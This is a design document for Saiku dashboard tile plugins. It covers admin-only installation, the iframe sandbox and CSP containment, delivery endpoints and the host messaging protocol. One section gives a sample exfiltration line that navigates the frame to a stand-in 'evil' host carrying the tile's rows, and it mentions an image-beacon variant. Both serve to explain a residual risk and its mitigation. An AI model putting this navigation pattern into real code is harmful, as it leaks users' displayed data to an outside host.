# App Builder tile plugins (saiku#1441)

Tile **plugins** let a `custom` dashboard/app tile render with self-contained HTML
+ inline JavaScript inside a locked-down sandboxed iframe — a bar chart, a gauge,
a bespoke widget — while the host feeds it the tile's query rows over a validated
`postMessage` protocol.

## Trust model — plugins are admin-installed, trusted code

**Plugin HTML comes ONLY from the admin registry, never from tile config.** An
operator drops a bundle into `saiku-home/tile-plugins/<id>/` (`plugin.json` +
`plugin.html`); a dashboard author only *references* an installed plugin by its
slug `id` (`tile.custom.options.pluginId`). There is no way to supply raw HTML/JS
through a tile — the authoring UI is a picker, and the persisted tile carries an
id, not markup.

This is deliberate. Treat a plugin the same way you treat a **server plugin JAR**:
installing one is an administrative act that grants that code the trust of running
in your users' browsers with the data its tiles display.

Delivery:

- In-app: `GET /rest/saiku/api/tile-plugins/{id}/html` (full-auth). Authors pick
  from `GET /rest/saiku/api/tile-plugins`.
- Embed: `GET /rest/saiku/api/embed/app/{path}/plugin/{id}/html`, token-scoped.
  The server serves the registry HTML **only** when `{id}` is referenced by a
  `type:"custom"` plugin tile in the pinned `.saikuapp` document — a guest can
  load exactly the plugins the embedded app uses and nothing else.

## What the sandbox does and does NOT contain

Each plugin frame runs with two containment layers:

1. **iframe `sandbox="allow-scripts"`** (no `allow-same-origin`). The frame runs
   at the opaque `null` origin, so plugin code **cannot** read the parent DOM,
   cookies, `localStorage`, the Saiku session token, or any other-origin data.
   No forms, popups, top-navigation, downloads, or pointer-lock.
2. **A strict CSP** (`default-src 'none'; script-src 'unsafe-inline'; style-src
   'unsafe-inline'; img-src data:; connect-src 'none'`). This blocks **background
   subresource egress** — `fetch`, `XHR`, `WebSocket`, `EventSource`,
   `sendBeacon`, remote scripts/styles/fonts/frames/workers, and the classic
   `<img src="https://evil…">` beacon.

**What neither layer stops:** a sandboxed frame can always **navigate itself**
(e.g. `location = "https://evil/?d=" + JSON.stringify(rows)`), and **no CSP fetch
directive governs navigation**. So a plugin can still exfiltrate the data shown in
**its own tile**. The sandbox fully isolates the Saiku origin — a plugin never
sees anything beyond its own tile's rows — but those rows are not confidential
*from the plugin itself*. That is exactly why plugin code is admin-installed and
trusted: an admin who installs a plugin trusts it with the data that plugin's tile
displays.

### Closing the self-navigation channel (operator option)

If you want to stop the self-navigation exfil channel too, set a restrictive
`frame-src` in the page/deployment CSP via `saiku.security.csp` (reverse proxy or
launcher CSP config). Constraining where plugin frames may navigate is the only
way to govern navigation — the per-tile sandbox + CSP cannot, by design.

## Bundle layout

```
saiku-home/tile-plugins/
  records-bars/
    plugin.json   # { "id": "records-bars", "label": "Records bars", "optionSchema"?: {...} }
    plugin.html   # self-contained srcdoc (inline CSS/JS only; data: images)
```

`id` must match `[a-z0-9][a-z0-9-]{0,63}` (slug — no path separators). The registry
scans lazily on a directory signature and skips broken bundles, surfacing parse
errors via `GET /rest/saiku/api/tile-plugins?errors=true`.

## Plugin ↔ host protocol

The host injects `window.SAIKU_PLUGIN_NONCE`; a plugin MUST echo it on every
message. Host → plugin: `init` (author options), `data` (query records), `theme`.
Plugin → host: `ready`, `resize` (height, clamped), `filter` (re-resolved against
the live cube — a plugin cannot inject MDX), `error` (rendered as text only).
See `saiku-ui/src/lib/dashboard/custom/pluginBridge.ts`.
